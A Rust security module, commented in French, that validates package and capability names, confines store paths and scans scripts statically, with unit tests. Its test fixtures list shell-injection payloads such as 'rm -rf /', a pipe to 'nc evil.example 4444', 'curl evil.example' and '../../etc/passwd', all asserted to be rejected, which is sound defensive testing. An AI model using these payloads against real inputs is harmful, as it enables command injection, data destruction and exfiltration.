//! Stream 5 — contrôles de sécurité des opérations Velotia.
//!
//! Trois garanties, vérifiées avant toute opération :
//!
//! 1. **Anti-injection** : les noms de capacité et de paquet sont validés par
//!    liste autorisée ET par rejet explicite des métacaractères shell
//!    (`;`, `&&`, `|`, backticks, `$()`, `${}`, redirections, quotes…).
//!    Réutilise [`crate::input_validation::InputValidator`] (règles omni :
//!    liste autorisée, noms réservés) en y ajoutant le durcissement Velotia.
//! 2. **Découverte en lecture seule** : le scan des dépendances implicites ne
//!    fait que LIRE des octets ([`crate::discovery`], analyse 100 % statique).
//!    Ce module n'exécute JAMAIS rien : aucun `std::process::Command`, aucun
//!    shell, aucun sous-processus. Les cibles de scan sont de plus confinées
//!    (fichier régulier, pas de symlink, pas de `..`, taille bornée).
//! 3. **Confinement du store** : un chemin de store est relatif à sa racine,
//!    sans traversal `..`, sans chemin absolu, sans octet nul ; le chemin
//!    joint reste composant par composant sous la racine.
//!
//! La politique de vérification des paquets ([`strict_policy`]) réutilise
//! [`crate::security::SecurityPolicy`] : signatures et checksums exigés,
//! paquets non fiables jamais autorisés.

use crate::discovery::{self, Finding};
use crate::input_validation::InputValidator;
use crate::security::SecurityPolicy;
use anyhow::{anyhow, Result};
use std::fs;
use std::path::{Component, Path, PathBuf};

/// Longueur max d'un nom de capacité ou de paquet (octets).
const MAX_NAME_LEN: usize = 255;

/// Longueur max d'un chemin relatif de store (octets).
const MAX_STORE_PATH_LEN: usize = 4096;

/// Taille max d'un fichier scanné : il est lu entièrement en mémoire.
const MAX_SCAN_BYTES: u64 = 64 * 1024 * 1024;

/// Métacaractères shell interdits dans les noms et les chemins.
/// L'espace n'y est pas : il est légitime dans un chemin de scan (jamais
/// passé à un shell ici) et reste de toute façon interdit dans les noms et
/// les composantes de store par la liste autorisée `[a-zA-Z0-9._+-]`.
const SHELL_METACHARS: &[char] = &[
    ';', '&', '|', '`', '$', '(', ')', '<', '>', '\'', '"', '\\', '\n', '\r', '\t', '\0', '!', '*',
    '?', '[', ']', '{', '}', '~', '#',
];

/// Rejette les métacaractères shell et les motifs d'injection dans `input`.
/// Les motifs multi-caractères sont testés d'abord pour un message précis ;
/// la liste de caractères couvre ensuite tout le reste (défense en profondeur).
fn reject_shell_injection(input: &str, kind: &str) -> Result<()> {
    for pattern in ["&&", "||", "$(", "${", ";;"] {
        if input.contains(pattern) {
            return Err(anyhow!(
                "{kind} contains forbidden shell pattern '{pattern}'"
            ));
        }
    }
    for &ch in SHELL_METACHARS {
        if input.contains(ch) {
            return Err(anyhow!("{kind} contains shell metacharacter '{ch}'"));
        }
    }
    Ok(())
}

/// Règles communes d'identifiant (capacité, paquet) : non vide, borné,
/// anti-injection, liste autorisée `[a-zA-Z0-9._+-]`, pas de `..`, et premier
/// caractère alphanumérique (un nom commençant par `-` serait une option CLI).
fn validate_identifier(name: &str, kind: &str) -> Result<()> {
    if name.is_empty() {
        return Err(anyhow!("{kind} cannot be empty"));
    }
    if name.len() > MAX_NAME_LEN {
        return Err(anyhow!("{kind} too long (max {MAX_NAME_LEN} bytes)"));
    }
    reject_shell_injection(name, kind)?;
    if !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'))
    {
        return Err(anyhow!(
            "{kind} contains characters outside [a-zA-Z0-9._+-]"
        ));
    }
    if name.contains("..") {
        return Err(anyhow!("{kind} cannot contain '..'"));
    }
    if !name.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return Err(anyhow!("{kind} must start with an alphanumeric character"));
    }
    Ok(())
}

/// Valide un nom de capacité Velotia (ex. `logind`, `service-management`).
///
/// Mêmes règles qu'un nom de paquet : liste autorisée, anti-injection, pas
/// de traversal, pas de nom réservé.
///
/// # Errors
///
/// Nom vide, trop long, contenant des métacaractères shell (`;`, `&&`, `|`,
/// backticks, `$()`…), des séparateurs de chemin, `..`, un premier caractère
/// non alphanumérique, ou un nom réservé (`con`, `prn`, `aux`, `nul`).
///
/// ```
/// use omnitia::velotia_security::validate_capability_name;
/// assert!(validate_capability_name("logind").is_ok());
/// assert!(validate_capability_name("cgroup-scope-slice-api").is_ok());
/// assert!(validate_capability_name("logind; rm -rf /").is_err());
/// assert!(validate_capability_name("logind$(id)").is_err());
/// ```
pub fn validate_capability_name(name: &str) -> Result<()> {
    validate_identifier(name, "capability name")?;
    InputValidator::validate_package_name(name)
}

/// Valide un nom de paquet (ex. `snapd`, `elogind`, `NetworkManager`).
///
/// Réutilise [`InputValidator::validate_package_name`] (règles omni : liste
/// autorisée, noms réservés) plus le durcissement Velotia (anti-injection
/// explicite, premier caractère alphanumérique).
///
/// # Errors
///
/// Mêmes cas que [`validate_capability_name`].
///
/// ```
/// use omnitia::velotia_security::validate_package_name;
/// assert!(validate_package_name("snapd").is_ok());
/// assert!(validate_package_name("systemd-shim").is_ok());
/// assert!(validate_package_name("snapd && curl evil.example").is_err());
/// assert!(validate_package_name("../etc/passwd").is_err());
/// ```
pub fn validate_package_name(name: &str) -> Result<()> {
    validate_identifier(name, "package name")?;
    InputValidator::validate_package_name(name)
}

/// Valide une composante de chemin de store : liste autorisée
/// `[a-zA-Z0-9._+-]`, pas de `..`, pas de `.` seul, premier caractère
/// alphanumérique ou `.` (fichiers cachés comme `.lock` autorisés).
fn validate_store_component(comp: &str) -> Result<()> {
    if comp.is_empty() || comp == "." || comp.contains("..") {
        return Err(anyhow!("forbidden store path component '{comp}'"));
    }
    if !comp
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'))
    {
        return Err(anyhow!(
            "store path component '{comp}' contains characters outside [a-zA-Z0-9._+-]"
        ));
    }
    if !comp.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '.') {
        return Err(anyhow!(
            "store path component '{comp}' must start with an alphanumeric character or '.'"
        ));
    }
    Ok(())
}

/// Valide la racine du store : non vide, sans octet nul, sans métacaractère
/// shell, sans composante `..`.
fn validate_root(root: &Path) -> Result<()> {
    if root.as_os_str().is_empty() {
        return Err(anyhow!("store root cannot be empty"));
    }
    let root_str = root.to_string_lossy();
    if root_str.contains('\0') {
        return Err(anyhow!("store root contains a null byte"));
    }
    reject_shell_injection(&root_str, "store root")?;
    if root.components().any(|c| matches!(c, Component::ParentDir)) {
        return Err(anyhow!("store root cannot contain '..'"));
    }
    Ok(())
}

/// Construit un chemin de store confiné : `root` + `relative`, où `relative`
/// ne peut pas s'échapper de la racine.
///
/// `relative` doit être un chemin relatif dont chaque segment séparé par `/`
/// est non vide et valide selon `[a-zA-Z0-9._+-]` : ni `..`, ni `.`, ni `//`,
/// ni slash final, ni racine absolue, ni séparateur `\`, ni octet nul, ni
/// métacaractère shell. La racine elle-même est vérifiée (pas de `..`).
/// Le résultat est contrôlé composant par composant (`Path::starts_with`,
/// pas une simple comparaison de préfixe de chaîne).
///
/// # Errors
///
/// Chemin vide, trop long, absolu, contenant `..`, `.`, un octet nul, un
/// métacaractère shell ou une composante hors liste autorisée ; racine vide
/// ou contenant `..` ; chemin joint hors de la racine.
///
/// ```
/// use std::path::Path;
/// use omnitia::velotia_security::store_path;
/// let root = Path::new("/var/lib/omnitia/store");
/// let p = store_path(root, "capabilities/logind.json").unwrap();
/// assert_eq!(p, Path::new("/var/lib/omnitia/store/capabilities/logind.json"));
/// assert!(store_path(root, "../../etc/passwd").is_err());
/// assert!(store_path(root, "/etc/passwd").is_err());
/// ```
pub fn store_path(root: &Path, relative: &str) -> Result<PathBuf> {
    if relative.is_empty() {
        return Err(anyhow!("store path cannot be empty"));
    }
    if relative.len() > MAX_STORE_PATH_LEN {
        return Err(anyhow!(
            "store path too long (max {MAX_STORE_PATH_LEN} bytes)"
        ));
    }
    if relative.contains('\0') {
        return Err(anyhow!("store path contains a null byte"));
    }
    reject_shell_injection(relative, "store path")?;
    let rel = Path::new(relative);
    if rel.is_absolute() {
        return Err(anyhow!("store path must be relative to the store root"));
    }
    // Segments bruts séparés par `/` : `Path::components` normalise les `.`
    // internes et les `//`, on les refuse donc explicitement ici (strict).
    for segment in relative.split('/') {
        validate_store_component(segment)?;
    }
    validate_root(root)?;
    let joined = root.join(rel);
    // Garde défensive : le joint doit rester sous la racine, composant par
    // composant (un préfixe de chaîne accepterait `/store-evil` pour `/store`).
    if !joined.starts_with(root) {
        return Err(anyhow!("store path escapes the store root"));
    }
    Ok(joined)
}

/// Valide un chemin de scan (cible de la découverte).
///
/// Non vide, sans octet nul, sans métacaractère shell, sans composante `..`.
/// Les chemins absolus sont autorisés (on scanne des fichiers système, ex.
/// `/usr/bin/snap-confine`) ; l'espace est autorisé car le chemin n'est jamais
/// passé à un shell.
///
/// # Errors
///
/// Chemin vide, contenant un octet nul, un métacaractère shell ou `..`.
pub fn validate_scan_path(path: &Path) -> Result<()> {
    if path.as_os_str().is_empty() {
        return Err(anyhow!("scan path cannot be empty"));
    }
    let path_str = path.to_string_lossy();
    if path_str.contains('\0') {
        return Err(anyhow!("scan path contains a null byte"));
    }
    reject_shell_injection(&path_str, "scan path")?;
    if path.components().any(|c| matches!(c, Component::ParentDir)) {
        return Err(anyhow!("scan path cannot contain '..'"));
    }
    Ok(())
}

/// Scanne un fichier pour y détecter les capacités implicites, SANS jamais l'exécuter.
///
/// Lecture seule des octets via [`crate::discovery::scan_file`] (analyse
/// statique). Avant la lecture, la cible est confinée :
///
/// - chemin valide ([`validate_scan_path`], pas de `..`) ;
/// - fichier régulier uniquement : ni symlink (évasion hors du store), ni
///   répertoire, ni FIFO/périphérique (une lecture pourrait bloquer) ;
/// - taille bornée à 64 Mio (le fichier est lu entièrement en mémoire).
///
/// Ce module ne lance aucun processus : le contenu analysé (scripts, chaînes
/// de binaires) n'est jamais interprété.
///
/// # Errors
///
/// Chemin invalide, cible absente ou illisible, symlink, fichier non régulier,
/// fichier trop volumineux.
///
/// ```no_run
/// use std::path::Path;
/// use omnitia::velotia_security::scan_file_readonly;
/// let findings = scan_file_readonly(Path::new("/usr/bin/snap-confine")).unwrap();
/// for f in &findings {
///     println!("{} (ligne {})", f.capability.label(), f.line);
/// }
/// ```
pub fn scan_file_readonly(path: &Path) -> Result<Vec<Finding>> {
    validate_scan_path(path)?;
    // `symlink_metadata` ne suit pas le lien : on refuse le symlink lui-même.
    let meta = fs::symlink_metadata(path)?;
    if meta.file_type().is_symlink() {
        return Err(anyhow!(
            "scan target is a symlink (refused): {}",
            path.display()
        ));
    }
    if !meta.is_file() {
        return Err(anyhow!(
            "scan target is not a regular file: {}",
            path.display()
        ));
    }
    if meta.len() > MAX_SCAN_BYTES {
        return Err(anyhow!(
            "scan target too large ({} bytes, max {MAX_SCAN_BYTES})",
            meta.len()
        ));
    }
    Ok(discovery::scan_file(path)?)
}

/// Scanne un texte pour y détecter les capacités implicites, sans exécution.
///
/// Script, chaînes extraites d'un binaire… Purement statique : le texte
/// n'est jamais interprété ni exécuté (délègue à [`crate::discovery::scan_text`]).
///
/// ```
/// use omnitia::velotia_security::scan_text_readonly;
/// use omnitia::discovery::Capability;
/// let findings = scan_text_readonly("systemctl start snapd");
/// assert_eq!(findings[0].capability, Capability::SystemctlCli);
/// ```
#[must_use]
pub fn scan_text_readonly(text: &str) -> Vec<Finding> {
    discovery::scan_text(text)
}

/// Politique de sécurité stricte pour les opérations Velotia.
///
/// Signatures et checksums vérifiés, miroirs contrôlés, paquets non fiables
/// JAMAIS autorisés (`allow_untrusted = false`). Réutilise [`SecurityPolicy`]
/// d'omni ; les serveurs de signatures et clés de confiance restent ceux de
/// la politique par défaut.
///
/// ```
/// use omnitia::velotia_security::strict_policy;
/// let policy = strict_policy();
/// assert!(!policy.allow_untrusted);
/// assert!(policy.verify_signatures && policy.verify_checksums);
/// ```
#[must_use]
pub fn strict_policy() -> SecurityPolicy {
    SecurityPolicy {
        verify_signatures: true,
        verify_checksums: true,
        allow_untrusted: false,
        check_mirrors: true,
        ..SecurityPolicy::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::discovery::Capability;

    /// Fixture « snapd-like » : mkdir cgroup (l.3), echo > cgroup.procs (l.4),
    /// busctl systemd1 (l.5), systemctl (l.6). Le shebang et `set -eu` ne
    /// produisent aucun finding.
    const SNAPD_LIKE: &str = "\
#!/bin/sh
set -eu
mkdir -p /sys/fs/cgroup/systemd/snap.foo.scope
echo $$ > /sys/fs/cgroup/systemd/snap.foo.scope/cgroup.procs
busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartTransientUnit
systemctl start snap.foo.service
";

    /// Charges d'injection : les métacaractères exigés par le contrat
    /// (`;`, `&&`, `|`, backticks, `$()`) et au-delà.
    const INJECTIONS: &[&str] = &[
        "snapd; rm -rf /",
        "snapd && curl evil.example",
        "snapd || true",
        "snapd | nc evil.example 4444",
        "snapd`whoami`",
        "snapd$(id)",
        "snapd${IFS}evil",
        "snapd\nevil",
        "snapd>out",
        "snapd<input",
        "snapd'quoted'",
        "snapd\"quoted\"",
        "snapd\\evil",
        "snapd\0evil",
        "snapd*",
        "snapd?",
        "snapd#comment",
        "snapd~root",
        "snapd!hist",
        "snapd[0]",
        "snapd{a,b}",
    ];

    /// Chemin temporaire unique par test (sûr en parallèle).
    fn temp_path(name: &str) -> PathBuf {
        std::env::temp_dir().join(format!(
            "omnitia_velotia_sec_{}_{}",
            std::process::id(),
            name
        ))
    }

    // --- Noms de capacité / paquet : valides ---

    #[test]
    fn valid_capability_names() {
        for name in [
            "logind",
            "service-management",
            "cgroup-scope-slice-api",
            "journald",
            "networkd",
            "resolved",
            "init",
            "elogind",
        ] {
            assert!(validate_capability_name(name).is_ok(), "{name}");
        }
    }

    #[test]
    fn valid_package_names() {
        for name in [
            "snapd",
            "elogind",
            "NetworkManager",
            "OpenRC",
            "LoginKit",
            "systemd-shim",
            "dinit",
            "s6",
            "runit",
            "gcc-9",
            "lib64.so.1",
            "python3.9",
        ] {
            assert!(validate_package_name(name).is_ok(), "{name}");
        }
    }

    // --- Noms : invalides (hors injection) ---

    #[test]
    fn empty_and_overlong_names_rejected() {
        let long = "a".repeat(MAX_NAME_LEN + 1);
        for name in ["", long.as_str()] {
            assert!(validate_capability_name(name).is_err());
            assert!(validate_package_name(name).is_err());
        }
        // À la borne max : accepté.
        assert!(validate_package_name(&"a".repeat(MAX_NAME_LEN)).is_ok());
    }

    #[test]
    fn traversal_separator_and_reserved_names_rejected() {
        for name in [
            "../evil", "a/b", "a\\b", "..", ".", "a..b", "-rf", "--help", ".hidden", "a b", "café",
            "con", "prn", "aux", "nul",
        ] {
            assert!(validate_capability_name(name).is_err(), "{name}");
            assert!(validate_package_name(name).is_err(), "{name}");
        }
    }

    // --- Injection : rejet explicite ---

    #[test]
    fn injection_rejected_in_names() {
        for payload in INJECTIONS {
            assert!(validate_capability_name(payload).is_err(), "{payload:?}");
            assert!(validate_package_name(payload).is_err(), "{payload:?}");
        }
    }

    #[test]
    fn injection_rejected_in_store_paths() {
        let root = Path::new("/store");
        for payload in INJECTIONS {
            assert!(store_path(root, payload).is_err(), "{payload:?}");
        }
    }

    #[test]
    fn injection_rejected_in_scan_paths() {
        for payload in INJECTIONS {
            assert!(
                validate_scan_path(Path::new(payload)).is_err(),
                "{payload:?}"
            );
        }
    }

    // --- Chemins de store : sûrs ---

    #[test]
    fn safe_store_paths_stay_under_root() {
        let root = Path::new("/var/lib/omnitia/store");
        for rel in [
            "glass.json",
            "state/glass.json",
            "snapd/manifest.json",
            "capabilities/logind.json",
            ".lock",
            "a+b/c.d-e_f",
        ] {
            let p = store_path(root, rel).unwrap_or_else(|e| panic!("{rel}: {e}"));
            assert!(p.starts_with(root), "{rel}");
            assert_eq!(p, root.join(rel));
        }
    }

    #[test]
    fn store_root_with_trailing_slash_or_relative() {
        // Racine avec slash final, et racine relative : le confinement tient.
        let p = store_path(Path::new("/store/"), "glass.json").unwrap();
        assert_eq!(p, Path::new("/store/glass.json"));
        let p = store_path(Path::new("state/store"), "glass.json").unwrap();
        assert!(p.starts_with(Path::new("state/store")));
    }

    // --- Chemins de store : dangereux ---

    #[test]
    fn dangerous_store_paths_rejected() {
        let root = Path::new("/store");
        for rel in [
            "",
            "..",
            ".",
            "../evil",
            "../../etc/passwd",
            "a/../../evil",
            "a/..",
            "a/../b",
            "a/./b",
            "/etc/passwd",
            "a\0b",
            "a\\b",
            "a b",
            "-rf",
            "a;rm",
            "a$(id)",
            "a`id`",
            "a|b",
            "a&&b",
        ] {
            assert!(store_path(root, rel).is_err(), "{rel:?}");
        }
        // Trop long.
        let long = format!("a/{}", "b".repeat(MAX_STORE_PATH_LEN));
        assert!(store_path(root, &long).is_err());
    }

    #[test]
    fn dangerous_store_roots_rejected() {
        for root in ["", "/store/../evil", "..", "/store/../../etc"] {
            assert!(
                store_path(Path::new(root), "glass.json").is_err(),
                "{root:?}"
            );
        }
        assert!(store_path(Path::new("/store\0evil"), "glass.json").is_err());
    }

    #[test]
    fn store_prefix_trick_does_not_escape() {
        // `Path::starts_with` compare composant par composant : `/store-evil`
        // n'est PAS sous `/store`. Une composante de store ne peut de toute
        // façon pas produire un tel chemin (relatif + composantes normales).
        let root = Path::new("/store");
        let evil = Path::new("/store-evil/glass.json");
        assert!(!evil.starts_with(root));
        // Et le chemin joint légitime reste bien sous la racine.
        let p = store_path(root, "glass.json").unwrap();
        assert!(p.starts_with(root));
    }

    // --- Scan : lecture seule, jamais d'exécution ---

    #[test]
    fn scan_text_is_static() {
        let findings = scan_text_readonly(SNAPD_LIKE);
        assert_eq!(findings.len(), 4);
        assert!(findings
            .iter()
            .any(|f| f.capability == Capability::CgroupFs && f.line == 3));
        assert!(findings
            .iter()
            .any(|f| f.capability == Capability::CgroupFs && f.line == 4));
        assert!(findings
            .iter()
            .any(|f| f.capability == Capability::SystemdDbus && f.line == 5));
        assert!(findings
            .iter()
            .any(|f| f.capability == Capability::SystemctlCli && f.line == 6));
        assert_eq!(
            discovery::unique_capabilities(&findings),
            vec![
                Capability::SystemdDbus,
                Capability::CgroupFs,
                Capability::SystemctlCli
            ]
        );
        assert_eq!(scan_text_readonly("").len(), 0);
    }

    #[test]
    fn scan_file_never_executes_the_script() {
        // Fixture : si le script était exécuté, `touch` créerait le marqueur.
        // Le scan doit détecter systemctl SANS créer le marqueur ni modifier
        // le fichier.
        let dir = temp_path("exec_dir");
        fs::create_dir_all(&dir).unwrap();
        let marker = dir.join("pwned.marker");
        let script = dir.join("fixture.sh");
        let content = format!(
            "#!/bin/sh\ntouch {}\nsystemctl start snapd\n",
            marker.display()
        );
        fs::write(&script, &content).unwrap();

        let findings = scan_file_readonly(&script).unwrap();
        assert!(findings
            .iter()
            .any(|f| f.capability == Capability::SystemctlCli));
        assert!(!marker.exists(), "le scan a exécuté le script !");
        assert_eq!(fs::read(&script).unwrap(), content.as_bytes());

        fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn scan_rejects_traversal_and_null() {
        assert!(validate_scan_path(Path::new("/tmp/../etc/passwd")).is_err());
        assert!(validate_scan_path(Path::new("a/../../b")).is_err());
        assert!(validate_scan_path(Path::new("a\0b")).is_err());
        assert!(validate_scan_path(Path::new("")).is_err());
        // Chemin absolu propre : autorisé (cible système légitime).
        assert!(validate_scan_path(Path::new("/usr/bin/snap-confine")).is_ok());
        // L'espace est autorisé dans un chemin de scan (jamais de shell).
        assert!(validate_scan_path(Path::new("/tmp/my script.sh")).is_ok());
    }

    #[test]
    fn scan_rejects_missing_and_directory() {
        let missing = temp_path("missing.sh");
        assert!(scan_file_readonly(&missing).is_err());
        let dir = temp_path("scan_dir");
        fs::create_dir_all(&dir).unwrap();
        assert!(scan_file_readonly(&dir).is_err());
        fs::remove_dir_all(&dir).ok();
    }

    #[cfg(unix)]
    #[test]
    fn scan_rejects_symlink() {
        let dir = temp_path("symlink_dir");
        fs::create_dir_all(&dir).unwrap();
        let target = dir.join("target.sh");
        let link = dir.join("link.sh");
        fs::write(&target, "systemctl start snapd\n").unwrap();
        std::os::unix::fs::symlink(&target, &link).unwrap();
        // Le symlink est refusé même si sa cible est un fichier régulier.
        assert!(scan_file_readonly(&link).is_err());
        // La cible directe, elle, est scannée.
        assert!(scan_file_readonly(&target).is_ok());
        fs::remove_dir_all(&dir).ok();
    }

    // --- Politique de sécurité ---

    #[test]
    fn strict_policy_never_allows_untrusted() {
        let policy = strict_policy();
        assert!(!policy.allow_untrusted);
        assert!(policy.verify_signatures);
        assert!(policy.verify_checksums);
        assert!(policy.check_mirrors);
        assert_ne!(policy.signature_servers.len(), 0);
    }
}
